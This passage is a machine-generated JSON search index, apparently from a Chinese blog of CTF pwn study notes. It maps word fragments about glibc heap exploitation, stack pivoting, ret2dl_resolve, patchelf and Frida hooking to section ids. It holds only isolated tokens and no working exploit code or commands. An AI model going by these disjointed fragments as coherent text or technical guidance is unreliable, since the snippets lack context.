"运行plt\",{\"1\":{\"44\":2}}],[\"源码分析\",{\"0\":{\"56\":1}}],[\"如何解释序列和字段分隔符\",{\"1\":{\"81\":1}}],[\"如何查\",{\"0\":{\"54\":1}}],[\"如颜色代码\",{\"1\":{\"79\":1}}],[\"如果不关心退出状态\",{\"1\":{\"88\":1}}],[\"如果不存在dt\",{\"1\":{\"74\":1}}],[\"如果此值为\",{\"1\":{\"88\":1}}],[\"如果没有指定文件\",{\"1\":{\"79\":1}}],[\"如果没有则加到对齐\",{\"1\":{\"32\":1}}],[\"如果文件内容能够在一屏内显示完毕\",{\"1\":{\"79\":1}}],[\"如果文件头中存在pt\",{\"1\":{\"75\":1}}],[\"如果下一块chunk是top\",{\"1\":{\"64\":1}}],[\"如果一样提示double\",{\"1\":{\"63\":1}}],[\"如果size小于get\",{\"1\":{\"56\":1}}],[\"如果有合适的就直接给\",{\"1\":{\"51\":1}}],[\"如果小于则直接等于0x20\",{\"1\":{\"32\":1}}],[\"了解\",{\"0\":{\"53\":1}}],[\"查看相关引用\",{\"1\":{\"90\":1}}],[\"查看程序当前信息\",{\"0\":{\"76\":1}}],[\"查看glibc的源码网址\",{\"1\":{\"52\":1}}],[\"查找关键结构体\",{\"1\":{\"35\":1}}],[\"刚好0x8的空间\",{\"1\":{\"51\":1}}],[\"向上\",{\"1\":{\"79\":1}}],[\"向上搜索字符串\",{\"1\":{\"79\":1}}],[\"向上滚动一页\",{\"1\":{\"79\":1}}],[\"向上申请内存\",{\"1\":{\"48\":1}}],[\"向下\",{\"1\":{\"79\":1}}],[\"向下搜索字符串\",{\"1\":{\"79\":1}}],[\"向下滚动一页\",{\"1\":{\"79\":1}}],[\"向下翻页\",{\"1\":{\"79\":1}}],[\"向top\",{\"1\":{\"51\":1}}],[\"否则将合并后的放入对应bin\",{\"1\":{\"51\":1}}],[\"申请\",{\"1\":{\"51\":1}}],[\"申请内存\",{\"1\":{\"51\":1}}],[\"申请内存<64bytes\",{\"1\":{\"51\":1}}],[\"申请内存的过程\",{\"0\":{\"51\":1}}],[\"申请小的内存空间\",{\"1\":{\"48\":1}}],[\"保护\",{\"1\":{\"84\":1}}],[\"保留最基本结构\",{\"1\":{\"50\":1}}],[\"保存第二个参数\",{\"1\":{\"44\":1}}],[\"保存第一个参数\",{\"1\":{\"44\":1}}],[\"保存原始的返回地址\",{\"1\":{\"44\":1}}],[\"保存寄存器\",{\"1\":{\"44\":1}}],[\"两个chunk会合并为一个较大的chunk\",{\"1\":{\"50\":1}}],[\"和\",{\"0\":{\"77\":1}}],[\"和bk\",{\"1\":{\"50\":1}}],[\"和size两个部分\",{\"1\":{\"50\":1}}],[\"和jmp\",{\"1\":{\"44\":1}}],[\"上一个chunk的大小否则\",{\"1\":{\"50\":1}}],[\"上一个chunk处于free状态的时候来表示\",{\"1\":{\"50\":1}}],[\"上面举的列子\",{\"1\":{\"10\":1}}],[\"含amp\",{\"1\":{\"50\":1}}],[\"完整的chunk\",{\"1\":{\"50\":1}}],[\"完成类似于初始化的操作比如现在我有类student那么我在student\",{\"1\":{\"12\":1}}],[\"子线程只能用mmap函数\",{\"1\":{\"48\":1}}],[\"从\",{\"1\":{\"74\":2}}],[\"从路径\",{\"1\":{\"74\":1}}],[\"从0x20到0x410\",{\"1\":{\"59\":1}}],[\"从libc2\",{\"1\":{\"59\":1}}],[\"从glibc2\",{\"1\":{\"51\":1}}],[\"从shared\",{\"1\":{\"48\":1}}],[\"从heap下方的data段\",{\"1\":{\"48\":1}}],[\"由操作系统加载该文件\",{\"1\":{\"75\":1}}],[\"由libc\",{\"1\":{\"48\":1}}],[\"由于这题涉及多线程\",{\"1\":{\"91\":1}}],[\"由于这个是开发知识就不细讲了\",{\"1\":{\"12\":1}}],[\"由于有个gets函数\",{\"1\":{\"84\":1}}],[\"由于是使用状态所以\",{\"1\":{\"50\":1}}],[\"由于是单链形式\",{\"1\":{\"29\":1}}],[\"由于我是是第一次的调用\",{\"1\":{\"44\":1}}],[\"由于做题的时候老是脑子不够用\",{\"1\":{\"31\":1}}],[\"由于linux中使用free\",{\"1\":{\"27\":1}}],[\"堆管理器用brk或者mmap函数去获取内存\",{\"1\":{\"49\":1}}],[\"堆管理器\",{\"0\":{\"48\":1},\"1\":{\"48\":1}}],[\"堆特性\",{\"1\":{\"47\":1}}],[\"堆结构学习\",{\"1\":{\"47\":1}}],[\"堆结构\",{\"1\":{\"30\":1}}],[\"随缘更新\",{\"1\":{\"47\":1}}],[\"学pwn日记\",{\"1\":{\"47\":1}}],[\"学习路线\",{\"0\":{\"41\":1},\"1\":{\"41\":1}}],[\"学习文章\",{\"1\":{\"28\":1,\"38\":1}}],[\"学习经验\",{\"1\":{\"16\":1}}],[\"有点做不动heap的题\",{\"1\":{\"47\":1}}],[\"做hgame的时候\",{\"1\":{\"47\":1}}],[\"方便我们理解我们patchelf要修改哪些东西\",{\"1\":{\"74\":1}}],[\"方便我们取出名字\",{\"1\":{\"46\":1}}],[\"方便我们了解\",{\"1\":{\"44\":1}}],[\"就记录下来\",{\"1\":{\"67\":1}}],[\"就进入fastbin\",{\"1\":{\"56\":1}}],[\"就作为上一个chunk的一部分来存数据\",{\"1\":{\"50\":1}}],[\"就像是\",{\"1\":{\"46\":1}}],[\"就是新获得unsroted\",{\"1\":{\"70\":1}}],[\"就是算偏移嘛\",{\"1\":{\"15\":1}}],[\"就是在这个类实列化的时候\",{\"1\":{\"12\":1}}],[\"就是同一个函数名字\",{\"1\":{\"11\":1}}],[\"其中\",{\"1\":{\"79\":1}}],[\"其中num就是我们malloc传的参数\",{\"1\":{\"32\":1}}],[\"其次tcache的fd指向的是chunk\",{\"1\":{\"63\":1}}],[\"其获取逻辑是\",{\"1\":{\"46\":1}}],[\"省略点将\",{\"1\":{\"46\":1}}],[\"博客园\",{\"1\":{\"45\":1,\"73\":1}}],[\"深入学习堆结构\",{\"0\":{\"47\":1}}],[\"深入理解\",{\"1\":{\"45\":1}}],[\"深入窥探动态链接\",{\"1\":{\"44\":1}}],[\"需要注意的是\",{\"1\":{\"50\":1}}],[\"需要实际实现\",{\"1\":{\"44\":1}}],[\"需要了解的参考这个文章\",{\"1\":{\"44\":1}}],[\"函数允许一个线程等待另一个线程结束\",{\"1\":{\"88\":1}}],[\"函数是\",{\"1\":{\"88\":1}}],[\"函数在成功时返回\",{\"1\":{\"88\":1}}],[\"函数的参数的指针\",{\"1\":{\"88\":1}}],[\"函数的伪声明\",{\"1\":{\"44\":1}}],[\"函数成功完成时\",{\"1\":{\"88\":1}}],[\"函数\",{\"1\":{\"88\":1}}],[\"函数地址=so地址+函数偏移\",{\"1\":{\"15\":1}}],[\"放入\",{\"1\":{\"44\":1}}],[\"使用此选项后\",{\"1\":{\"79\":1}}],[\"使用解析后的地址跳转执行目标函数\",{\"1\":{\"44\":1}}],[\"使用java平台\",{\"1\":{\"8\":1,\"9\":1}}],[\"使用java的平台\",{\"0\":{\"8\":1}}],[\"恢复原始的返回地址\",{\"1\":{\"44\":1}}],[\"恢复第一个参数\",{\"1\":{\"44\":1}}],[\"恢复第二个参数\",{\"1\":{\"44\":1}}],[\"恢复寄存器\",{\"1\":{\"44\":1}}],[\"返回解析后的函数地址在\",{\"1\":{\"44\":1}}],[\"返回地址\",{\"1\":{\"44\":2}}],[\"来看看运行的顺序\",{\"1\":{\"91\":1}}],[\"来看看对应函数运行的时候n的值\",{\"1\":{\"91\":1}}],[\"来实现一个fake\",{\"1\":{\"66\":1}}],[\"来获取名字了\",{\"1\":{\"46\":1}}],[\"来解析符号地址\",{\"1\":{\"44\":1}}],[\"来到了\",{\"1\":{\"25\":1}}],[\"第二个参数\",{\"1\":{\"44\":1}}],[\"第一次拿到这个附件\",{\"1\":{\"78\":1}}],[\"第一次我使用的教程上面说的\",{\"1\":{\"21\":1}}],[\"第一个参数\",{\"1\":{\"44\":1}}],[\"通常是符号索引\",{\"1\":{\"44\":1}}],[\"通过fastbin\",{\"1\":{\"56\":1}}],[\"通过p的fd获取上一个chunk\",{\"1\":{\"65\":1}}],[\"通过p的fd\",{\"1\":{\"39\":1}}],[\"通过将ebp覆盖成构造的fake\",{\"1\":{\"24\":1}}],[\"传递\",{\"1\":{\"44\":1}}],[\"注意\",{\"1\":{\"44\":1}}],[\"汇编\",{\"1\":{\"44\":1}}],[\"示例\",{\"1\":{\"44\":1}}],[\"实验float的存储数据\",{\"0\":{\"85\":1}}],[\"实践\",{\"0\":{\"70\":1}}],[\"实现会在这里\",{\"1\":{\"44\":1}}],[\"实现函数调用\",{\"1\":{\"44\":1}}],[\"实际的\",{\"1\":{\"44\":1}}],[\"实际实现会根据系统的动态链接器的具体需求和优化而有所不同\",{\"1\":{\"44\":1}}],[\"实战\",{\"0\":{\"17\":1}}],[\"最终让fd和bk写上了main\",{\"1\":{\"72\":1}}],[\"最后就是检查input是否为flag了\",{\"1\":{\"90\":1}}],[\"最后成功\",{\"1\":{\"86\":1}}],[\"最后我们直接在程序源代码重找cmp的部分找到了\",{\"1\":{\"85\":1}}],[\"最后我们jmp过去\",{\"1\":{\"44\":1}}],[\"最后的malloc变为malloc一个更小的chunk\",{\"1\":{\"71\":1}}],[\"最简单的结构\",{\"1\":{\"50\":1}}],[\"最小chunk为0x20\",{\"1\":{\"32\":1}}],[\"与less类似\",{\"1\":{\"79\":1}}],[\"与got\",{\"1\":{\"44\":1}}],[\"与bk\",{\"1\":{\"39\":1}}],[\"自动跳转plt\",{\"1\":{\"44\":1}}],[\"33\",{\"1\":{\"92\":1}}],[\"30\",{\"1\":{\"91\":1}}],[\"30h\",{\"1\":{\"84\":1,\"89\":1}}],[\"31\",{\"1\":{\"90\":1,\"91\":1,\"92\":1}}],[\"31里面引用了key检查\",{\"1\":{\"63\":1}}],[\"3ch\",{\"1\":{\"89\":1}}],[\"34\",{\"1\":{\"85\":1}}],[\"32\",{\"1\":{\"70\":1,\"71\":1,\"91\":4,\"92\":1}}],[\"32位\",{\"1\":{\"69\":1}}],[\"3\",{\"1\":{\"44\":2,\"70\":1,\"71\":1,\"75\":1,\"79\":1,\"89\":2,\"91\":10,\"92\":1}}],[\"36\",{\"1\":{\"35\":1}}],[\"知乎\",{\"1\":{\"44\":1}}],[\"部分前置知识讲解\",{\"0\":{\"43\":1}}],[\"调试技巧\",{\"0\":{\"40\":1}}],[\"调用\",{\"1\":{\"44\":1}}],[\"调用构造函数\",{\"1\":{\"12\":1}}],[\"调用原函数\",{\"1\":{\"12\":1}}],[\"调用原本的函数\",{\"0\":{\"10\":1}}],[\"调用原来的函数\",{\"1\":{\"9\":1,\"11\":1}}],[\"把变量名字改改\",{\"1\":{\"89\":1}}],[\"把中间的chunk忽略掉\",{\"1\":{\"39\":1}}],[\"把fake\",{\"1\":{\"25\":1}}],[\"等效为\",{\"1\":{\"39\":1}}],[\"ⅱ\",{\"1\":{\"39\":1}}],[\"ⅰ\",{\"1\":{\"39\":1}}],[\"脱链\",{\"1\":{\"39\":1}}],[\"将控制权移交给ld\",{\"1\":{\"75\":1}}],[\"将返回地址移动到\",{\"1\":{\"44\":1}}],[\"将p\",{\"1\":{\"39\":2}}],[\"将reloc\",{\"1\":{\"44\":1}}],[\"将rip寄存器改值\",{\"1\":{\"25\":1}}],[\"将rbp寄存器改值\",{\"1\":{\"25\":1}}],[\"检查double\",{\"1\":{\"60\":1}}],[\"检查\",{\"1\":{\"39\":1}}],[\"检查下一个chunk的prev\",{\"1\":{\"39\":1}}],[\"流程知道了\",{\"1\":{\"92\":1}}],[\"流程\",{\"0\":{\"39\":1,\"49\":1,\"90\":1}}],[\"前一个chunk的指针\",{\"1\":{\"38\":1}}],[\"待脱链的空闲chunk的指针\",{\"1\":{\"38\":1}}],[\"宏定义\",{\"1\":{\"38\":1}}],[\"明确一下对象双向链表\",{\"1\":{\"38\":1}}],[\"腾讯云\",{\"1\":{\"38\":1}}],[\"腾讯云开发者社区\",{\"1\":{\"38\":1}}],[\"漏洞学习\",{\"0\":{\"37\":1}}],[\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",{\"1\":{\"85\":1}}],[\"但是好像可以用命令行来解决这个问题比如我们这里用指令\",{\"1\":{\"24\":1}}],[\"但是功能较少\",{\"1\":{\"79\":1}}],[\"但是我忽略了\",{\"1\":{\"72\":1}}],[\"但是觉得还是学了东西\",{\"1\":{\"67\":1}}],[\"但是calloc是不会拿tcache的\",{\"1\":{\"61\":1}}],[\"但是其实这里r\",{\"1\":{\"46\":1}}],[\"但是没有清空\",{\"1\":{\"36\":1}}],[\"马上free了\",{\"1\":{\"36\":1}}],[\"指向一个指针的指针\",{\"1\":{\"88\":1}}],[\"指向将被传递给\",{\"1\":{\"88\":1}}],[\"指向将由新线程执行的函数的函数指针\",{\"1\":{\"88\":1}}],[\"指向\",{\"1\":{\"88\":2}}],[\"指向的是否是p\",{\"1\":{\"39\":1}}],[\"指针为char类型\",{\"1\":{\"35\":1}}],[\"指令的地址\",{\"1\":{\"44\":1}}],[\"指令来查看对应地址\",{\"1\":{\"30\":1}}],[\"指令\",{\"1\":{\"25\":1}}],[\"存在于tls\",{\"1\":{\"59\":1}}],[\"存储\",{\"1\":{\"46\":1}}],[\"存一个int\",{\"1\":{\"35\":1}}],[\"存一个结构体指针\",{\"1\":{\"35\":1}}],[\"存name\",{\"1\":{\"35\":1}}],[\"存content\",{\"1\":{\"35\":1}}],[\"存\",{\"1\":{\"35\":1}}],[\"存size\",{\"1\":{\"35\":1}}],[\"存使用情况\",{\"1\":{\"35\":2}}],[\"存入fake\",{\"1\":{\"25\":1}}],[\"557bbe9bf2e9\",{\"1\":{\"90\":1}}],[\"557bbe9bf803\",{\"1\":{\"89\":1}}],[\"557bbe9c22c0\",{\"1\":{\"89\":1}}],[\"557bbe9c22a0\",{\"1\":{\"89\":1}}],[\"557bbe9c2280\",{\"1\":{\"89\":1,\"90\":2}}],[\"5\",{\"1\":{\"35\":1,\"79\":3,\"89\":1,\"91\":2}}],[\"quiet\",{\"1\":{\"79\":1}}],[\"quit\",{\"1\":{\"19\":1,\"79\":2}}],[\"q\",{\"1\":{\"79\":2}}],[\"qword\",{\"1\":{\"35\":1}}],[\"进入\",{\"1\":{\"35\":1}}],[\"进行内存释放时\",{\"1\":{\"27\":1}}],[\"分析一下题\",{\"0\":{\"35\":1}}],[\"脚本\",{\"0\":{\"33\":1,\"92\":1}}],[\"29\",{\"1\":{\"91\":1}}],[\"25\",{\"1\":{\"91\":1}}],[\"24\",{\"1\":{\"91\":1}}],[\"22\",{\"1\":{\"91\":1}}],[\"21\",{\"1\":{\"91\":1}}],[\"28\",{\"1\":{\"91\":1}}],[\"28h\",{\"1\":{\"89\":1}}],[\"28355\",{\"1\":{\"86\":1}}],[\"28125\",{\"1\":{\"84\":3,\"85\":2}}],[\"27\",{\"1\":{\"67\":1,\"69\":1,\"91\":1}}],[\"2^<size\",{\"1\":{\"63\":1}}],[\"23\",{\"1\":{\"52\":1,\"91\":1}}],[\"2学习笔记\",{\"0\":{\"52\":1}}],[\"26\",{\"1\":{\"91\":1}}],[\"26开始引入\",{\"1\":{\"59\":1}}],[\"26引入\",{\"1\":{\"51\":1}}],[\"26gx\",{\"1\":{\"30\":3}}],[\"2存的是\",{\"1\":{\"44\":1}}],[\"2+n\",{\"1\":{\"44\":1}}],[\"20h\",{\"1\":{\"89\":1}}],[\"2024\",{\"1\":{\"67\":1}}],[\"2024hgameweek3\",{\"0\":{\"67\":1}}],[\"20\",{\"1\":{\"35\":2,\"91\":1}}],[\"20是存name的\",{\"1\":{\"35\":1}}],[\"2\",{\"1\":{\"32\":1,\"44\":1,\"52\":1,\"60\":3,\"63\":2,\"70\":1,\"71\":1,\"79\":1,\"89\":1,\"91\":10,\"92\":1}}],[\"无法根据malloc\",{\"1\":{\"31\":1}}],[\"无名图书\",{\"1\":{\"1\":1}}],[\"写一个计算chunk大小的程序\",{\"0\":{\"31\":1}}],[\"计算\",{\"1\":{\"30\":1}}],[\"再去查找libc的基地址\",{\"1\":{\"30\":1}}],[\"再利用leave\",{\"1\":{\"24\":1}}],[\"同理设计为ptr\",{\"1\":{\"66\":1}}],[\"同一个地址\",{\"1\":{\"30\":1}}],[\"同步方式\",{\"1\":{\"14\":1}}],[\"另一个为0x110\",{\"1\":{\"30\":1}}],[\"大于8个就行\",{\"1\":{\"70\":1}}],[\"大于max\",{\"1\":{\"27\":1}}],[\"大多数性质和fastbin是一样的\",{\"1\":{\"61\":1}}],[\"大概就是调用\",{\"1\":{\"44\":1}}],[\"大小\",{\"1\":{\"57\":1}}],[\"大小检查\",{\"1\":{\"39\":1}}],[\"大小为0x30\",{\"1\":{\"30\":1}}],[\"用于接收被等待线程的退出状态\",{\"1\":{\"88\":1}}],[\"用于等待指定的线程结束\",{\"1\":{\"88\":1}}],[\"用于定义字段边界\",{\"1\":{\"81\":1}}],[\"用于在文件中加上行号\",{\"1\":{\"79\":1}}],[\"用于查看文件的后几行内容\",{\"1\":{\"79\":1}}],[\"用于查看文件的前几行内容\",{\"1\":{\"79\":1}}],[\"用于分页查看文件内容\",{\"1\":{\"79\":1}}],[\"用于将文件内容输出到终端上\",{\"1\":{\"79\":1}}],[\"用于检查\",{\"1\":{\"63\":1}}],[\"用于说明目的\",{\"1\":{\"44\":1}}],[\"用结构tcache\",{\"1\":{\"59\":1}}],[\"用户申请内存的时候\",{\"1\":{\"50\":1}}],[\"用户使用malloc函数向堆管理器申请一块内存空间\",{\"1\":{\"49\":1}}],[\"用来表示\",{\"1\":{\"46\":1}}],[\"用x\",{\"1\":{\"30\":1}}],[\"用vmmap指令查找heap最开始的位置\",{\"1\":{\"30\":1}}],[\"用提取数组的方式依次hook这些重载函数\",{\"1\":{\"11\":1}}],[\"代码\",{\"1\":{\"29\":1}}],[\"机制\",{\"0\":{\"29\":1},\"1\":{\"29\":1}}],[\"当一个线程结束时\",{\"1\":{\"88\":1}}],[\"当检查一样时候\",{\"1\":{\"63\":1}}],[\"当对应的tcahe\",{\"1\":{\"28\":1}}],[\"当我们可以多写一个字节的时候我们可以构造一个fake\",{\"1\":{\"66\":1}}],[\"当我们申请0xn0和0xn8内存大小的时候\",{\"1\":{\"51\":1}}],[\"当我们执行read函数的时候\",{\"1\":{\"25\":1}}],[\"当我们获取到java类之后\",{\"1\":{\"9\":1}}],[\"一筹莫展\",{\"1\":{\"78\":1}}],[\"一共两个部分\",{\"1\":{\"59\":1}}],[\"一共有64个bins\",{\"1\":{\"28\":1}}],[\"一般是prev\",{\"1\":{\"50\":1}}],[\"一般申请较大的内存空间\",{\"1\":{\"48\":1}}],[\"一对应\",{\"1\":{\"44\":1}}],[\"一\",{\"1\":{\"44\":1}}],[\"一道题彻底理解\",{\"1\":{\"38\":1}}],[\"一个是对应链表的元素数量\",{\"1\":{\"59\":1}}],[\"一个是对应大小的tcache\",{\"1\":{\"59\":1}}],[\"一个gundam包含两个chunk\",{\"1\":{\"30\":1}}],[\"一个测试脚本\",{\"0\":{\"19\":1}}],[\"一个好看的电子书网站\",{\"1\":{\"1\":1}}],[\"结构体的指针\",{\"1\":{\"88\":1}}],[\"结构图\",{\"1\":{\"29\":1}}],[\"结合偏移值从而得到libc的加载地址\",{\"1\":{\"27\":1}}],[\"结果\",{\"0\":{\"72\":1},\"1\":{\"12\":1}}],[\"可以传递\",{\"1\":{\"88\":1}}],[\"可以用于查看和编辑文件内容\",{\"1\":{\"79\":1}}],[\"可以向上翻页\",{\"1\":{\"79\":1}}],[\"可以查看当前libc和ld的版本\",{\"1\":{\"76\":1}}],[\"可以得到libc\",{\"1\":{\"76\":1}}],[\"可以粗俗得当作一个属于\",{\"1\":{\"46\":1}}],[\"可以通过use\",{\"1\":{\"27\":1}}],[\"可以构造多个同名字的函数\",{\"1\":{\"11\":1}}],[\"中\",{\"1\":{\"44\":3}}],[\"中被使用\",{\"1\":{\"44\":1}}],[\"中push\",{\"1\":{\"44\":1}}],[\"中的一个函数\",{\"1\":{\"88\":1}}],[\"中的这个n\",{\"1\":{\"46\":1}}],[\"中的num获取chunk的size\",{\"1\":{\"31\":1}}],[\"中的空闲\",{\"1\":{\"27\":1}}],[\"中出现了调用原本的函数\",{\"1\":{\"10\":1}}],[\"6\",{\"1\":{\"77\":3,\"79\":1,\"90\":1,\"91\":2,\"92\":5}}],[\"6的当前绑定地址\",{\"1\":{\"76\":1}}],[\"6链接库实现\",{\"1\":{\"48\":1}}],[\"64位\",{\"1\":{\"50\":1,\"51\":1,\"69\":1}}],[\"64\",{\"1\":{\"44\":1,\"77\":1,\"84\":1}}],[\"64b\",{\"1\":{\"27\":1}}],[\"61428\",{\"1\":{\"19\":1}}],[\"此时我们rsp\",{\"1\":{\"25\":1}}],[\"程序寻找libc的顺序\",{\"0\":{\"74\":1}}],[\"程序会自动保存下一个指令的地址\",{\"1\":{\"25\":1}}],[\"程序员可以选择显性地去书写和类同名地一个public方法\",{\"1\":{\"12\":1}}],[\"以及value的部分\",{\"1\":{\"91\":1}}],[\"以及指针原本的位置\",{\"1\":{\"70\":1,\"71\":1}}],[\"以及最容易理解错的是\",{\"1\":{\"25\":1}}],[\"以便于交互\",{\"1\":{\"8\":1}}],[\"栈的指针寄存器\",{\"1\":{\"25\":1}}],[\"栈迁移+float数据格式\",{\"0\":{\"84\":1}}],[\"栈迁移核心\",{\"0\":{\"25\":1}}],[\"栈迁移的大致操作\",{\"0\":{\"24\":1}}],[\"栈迁移\",{\"0\":{\"23\":1}}],[\"接下来我们需要理解\",{\"1\":{\"25\":1}}],[\"接下来我们需要筛选\",{\"1\":{\"19\":1}}],[\"换句话说\",{\"1\":{\"25\":1}}],[\"到现在我们就可以理清楚了核心需要实现的部分\",{\"1\":{\"25\":1}}],[\"​\",{\"1\":{\"25\":1,\"41\":1,\"68\":1}}],[\"原理3\",{\"1\":{\"25\":1}}],[\"原理\",{\"0\":{\"32\":1,\"69\":1},\"1\":{\"25\":1}}],[\"那么就是libc\",{\"1\":{\"77\":1}}],[\"那么就很明确了\",{\"1\":{\"39\":1}}],[\"那么fd\",{\"1\":{\"66\":1}}],[\"那么链表\",{\"1\":{\"60\":1}}],[\"那么输入指令后我们找到了这个chunk\",{\"1\":{\"30\":1}}],[\"那么第八个的地址\",{\"1\":{\"30\":1}}],[\"那么我们就知道了\",{\"1\":{\"85\":1}}],[\"那么我们malloc三次获取我们想要的地址的读写权\",{\"1\":{\"60\":1}}],[\"那么我们如何找到它呢\",{\"1\":{\"30\":1}}],[\"那么我们的rsp也成功完成了迁移工作\",{\"1\":{\"25\":1}}],[\"那么\",{\"1\":{\"25\":1}}],[\"那么同理\",{\"1\":{\"25\":1}}],[\"那么下面是实现原理图\",{\"1\":{\"25\":1}}],[\"那么这个指令的本质\",{\"1\":{\"25\":1}}],[\"新的fake\",{\"1\":{\"25\":1}}],[\"routine\",{\"1\":{\"88\":3}}],[\"rodata\",{\"1\":{\"85\":1}}],[\"ropgadget\",{\"1\":{\"24\":1}}],[\"rpath\",{\"1\":{\"74\":1,\"77\":2}}],[\"runpath会ld忽略ld\",{\"1\":{\"74\":1}}],[\"runpath再去寻找dt\",{\"1\":{\"74\":1}}],[\"runpath\",{\"1\":{\"74\":1}}],[\"runtime\",{\"0\":{\"45\":1},\"1\":{\"44\":8,\"45\":2}}],[\"raw\",{\"1\":{\"79\":1}}],[\"range\",{\"1\":{\"65\":1,\"70\":3,\"71\":2}}],[\"random\",{\"1\":{\"63\":1}}],[\"rax\",{\"1\":{\"44\":5,\"85\":3}}],[\"r\",{\"1\":{\"46\":9,\"70\":17,\"71\":17,\"79\":1,\"86\":5}}],[\"rsi\",{\"1\":{\"44\":2}}],[\"rsp+28h\",{\"1\":{\"89\":1}}],[\"rsp+20h\",{\"1\":{\"89\":1}}],[\"rsp+2ch\",{\"1\":{\"84\":1,\"85\":1}}],[\"rsp+18h\",{\"1\":{\"89\":1}}],[\"rsp+10h\",{\"1\":{\"89\":1}}],[\"rsp+4h\",{\"1\":{\"89\":1}}],[\"rsp+0h\",{\"1\":{\"84\":1,\"89\":1}}],[\"rsp向下跑一下\",{\"1\":{\"25\":1}}],[\"rsp向下移动一格\",{\"1\":{\"25\":1}}],[\"rsp\",{\"1\":{\"25\":1,\"44\":1}}],[\"rsp定位的\",{\"1\":{\"25\":1}}],[\"rdi\",{\"1\":{\"44\":1}}],[\"rdx\",{\"1\":{\"44\":2}}],[\"rcx\",{\"1\":{\"44\":2}}],[\"rbp\",{\"1\":{\"25\":1,\"84\":2,\"85\":1,\"89\":6}}],[\"readfsqword\",{\"1\":{\"89\":1}}],[\"reasons\",{\"1\":{\"29\":1}}],[\"reg\",{\"1\":{\"85\":1,\"91\":1}}],[\"replace\",{\"1\":{\"77\":1}}],[\"recvuntil\",{\"1\":{\"70\":6,\"71\":6,\"86\":1}}],[\"record\",{\"1\":{\"60\":1}}],[\"redo\",{\"1\":{\"60\":1}}],[\"redundant\",{\"1\":{\"29\":1}}],[\"relro\",{\"1\":{\"84\":2}}],[\"rel\",{\"1\":{\"46\":9,\"60\":1}}],[\"reloc\",{\"0\":{\"46\":1},\"1\":{\"44\":4,\"45\":1,\"46\":2}}],[\"related\",{\"1\":{\"0\":1}}],[\"remote\",{\"1\":{\"19\":1,\"86\":1}}],[\"re\",{\"0\":{\"98\":1},\"1\":{\"19\":1}}],[\"ret2dl\",{\"0\":{\"42\":1}}],[\"ret指令的地方\",{\"1\":{\"25\":1}}],[\"ret\",{\"1\":{\"25\":2,\"44\":1}}],[\"ret这个gadget将esp劫持到fake\",{\"1\":{\"24\":1}}],[\"retval\",{\"1\":{\"15\":1,\"88\":2}}],[\"return\",{\"1\":{\"9\":1,\"11\":6,\"33\":1,\"63\":1,\"70\":1,\"71\":1,\"84\":2,\"85\":1,\"89\":1}}],[\"resolve部分详细解说\",{\"0\":{\"45\":1}}],[\"resolve函数\",{\"1\":{\"44\":2}}],[\"resolve\",{\"1\":{\"44\":6,\"45\":2}}],[\"resuming\",{\"1\":{\"19\":1}}],[\"res\",{\"1\":{\"9\":3,\"11\":3}}],[\"因为当tcache\",{\"1\":{\"70\":1}}],[\"因为如果unsorted\",{\"1\":{\"70\":1}}],[\"因为要绕过unlink的安全检查\",{\"1\":{\"66\":1}}],[\"因为还有prev\",{\"1\":{\"60\":1}}],[\"因为这些寄存器会在\",{\"1\":{\"44\":1}}],[\"因为\",{\"1\":{\"25\":1}}],[\"因为我们可以利用下一面一个chunk的prev\",{\"1\":{\"51\":1}}],[\"因为我们使用的栈其实本质就是基于rbp\",{\"1\":{\"25\":1}}],[\"因为我们常使用leave\",{\"1\":{\"25\":1}}],[\"因为大多数时候我都是去ida直接找的这个gadget\",{\"1\":{\"24\":1}}],[\"因为已经遇到了很多次了\",{\"1\":{\"23\":1}}],[\"简单栈迁移\",{\"0\":{\"22\":1}}],[\"我直接copy了\",{\"1\":{\"51\":1}}],[\"我猜测大概是因为我们frida修改了端口号\",{\"1\":{\"21\":1}}],[\"我们猜测是每个函数要等待上一个函数执行完毕再执行\",{\"1\":{\"90\":1}}],[\"我们点入value变量\",{\"1\":{\"90\":1}}],[\"我们手搓一个程序\",{\"1\":{\"85\":1}}],[\"我们先把unsorted\",{\"1\":{\"69\":1}}],[\"我们一次性只能new一个0xff大小的chunk\",{\"1\":{\"69\":1}}],[\"我们就相当于chunk的p为0也就是我们构造的fake\",{\"1\":{\"66\":1}}],[\"我们的size得>=2\",{\"1\":{\"60\":1}}],[\"我们需要修改的plt条目的位置\",{\"1\":{\"46\":1}}],[\"我们可以知道\",{\"1\":{\"60\":1}}],[\"我们可以通过reloc\",{\"1\":{\"46\":1}}],[\"我们可以发现这个地方fd和bk都指向了\",{\"1\":{\"30\":1}}],[\"我们假设我们的函数在plt\",{\"1\":{\"44\":1}}],[\"我们程序究竟是怎么运行的\",{\"1\":{\"44\":1}}],[\"我们主要探讨在第一次数据绑定的时候\",{\"1\":{\"44\":1}}],[\"我们这里开始简单运算一下\",{\"1\":{\"35\":1}}],[\"我们这里知道了第七个地址\",{\"1\":{\"30\":1}}],[\"我们这里选择修改nickname这个属性\",{\"1\":{\"13\":1}}],[\"我们通过连续申请8个gundam\",{\"1\":{\"30\":1}}],[\"我们来到了leave\",{\"1\":{\"25\":1}}],[\"我们只要能够实现这两个部分就可以了\",{\"1\":{\"25\":1}}],[\"我们在ebp这个位置放入我们我们希望这个栈最终落脚点\",{\"1\":{\"25\":1}}],[\"我们执行指令\",{\"1\":{\"19\":1}}],[\"我们首先要获取它的包名提前声明这里实战\",{\"1\":{\"16\":1}}],[\"我们调试一个程序的时候\",{\"1\":{\"16\":1}}],[\"我们直接通过\",{\"1\":{\"9\":1}}],[\"连接\",{\"0\":{\"21\":1}}],[\"初次体验\",{\"0\":{\"20\":1}}],[\"留着后天来写\",{\"1\":{\"19\":1}}],[\">prev\",{\"1\":{\"66\":1}}],[\">counts\",{\"1\":{\"63\":1}}],[\">chunk2\",{\"1\":{\"60\":5}}],[\">chunk1的死循环\",{\"1\":{\"60\":1}}],[\">chunk1\",{\"1\":{\"60\":5}}],[\">next\",{\"1\":{\"63\":1}}],[\">entries\",{\"1\":{\"63\":1}}],[\">key\",{\"1\":{\"63\":1}}],[\">mutex\",{\"1\":{\"60\":2}}],[\">=\",{\"1\":{\"60\":2,\"92\":1}}],[\">size\",{\"1\":{\"60\":2,\"66\":1}}],[\">system\",{\"1\":{\"60\":3}}],[\">addr\",{\"1\":{\"60\":1}}],[\">64bytes\",{\"1\":{\"51\":1}}],[\">fd都是p\",{\"1\":{\"66\":1}}],[\">fd等于bk\",{\"1\":{\"65\":1}}],[\">fd是否等于p\",{\"1\":{\"65\":1}}],[\">fd置为\",{\"1\":{\"39\":1}}],[\">fd\",{\"1\":{\"39